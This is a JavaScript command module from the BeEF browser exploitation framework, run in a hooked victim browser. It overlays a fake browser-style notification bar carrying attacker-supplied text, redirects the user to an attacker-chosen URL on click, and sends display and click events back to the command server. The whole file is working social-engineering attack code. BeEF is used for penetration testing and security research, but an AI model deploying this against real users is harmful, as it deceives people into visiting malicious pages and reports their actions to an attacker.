//
// Copyright (c) 2006-2025Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - https://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {

	var id = beef.dom.generateID();
	var pid = beef.dom.generateID();
	var zztop = beef.dom.getHighestZindex()+1;
	var el = beef.dom.createElement('div',{'id':id,'style':'width:100%; position:fixed; top:0px; left:0px; margin:0; padding:2px 20px 5px 24px; z-index:'+zztop+'; border-bottom:1px solid black; background:#ffffda; display:none; font-family: \'Tahoma\',sans-serif; font-size: 12px; '});
	var ell = beef.dom.createElement('div',{'style':'width: 16px; height: 18px; padding: 0; margin: 3px 0px 5px 5px; position: absolute; left: 0px; top: 0px; background-image: url(data:image/png;base64,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);'})
	var elr = beef.dom.createElement('div',{'style':'width: 8px; height: 8px; padding: 0; margin: 7px 50px 5px 0px; position: absolute; right: 0px; top: 0px; background-image: url(data:image/png;base64,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);'})
	var elp = beef.dom.createElement('p',{'id':pid,'style':'padding: 0; margin: 0 50px 0 4px;'});
	$j('body').append(el);
	var hid = '#'+id;
	var hpid = '#'+pid;
	$j(hid).append(elp);
	$j(hpid).html(decodeURIComponent(beef.encode.base64.decode('<%= Base64.strict_encode64(@notification_text) %>')));
	$j(hid).append(ell);
	$j(hid).append(elr);
	$j(hid).click(function() {
		$j(this).slideUp(300,function() {
			$j(this).remove();
		});
		window.location = '<%= @url %>';
		beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=User has clicked the notification');
	});
	$j(hid).css('cursor','pointer');
	$j(hid).slideDown(300,function() {
		beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=Notification has been displayed');
	});

});
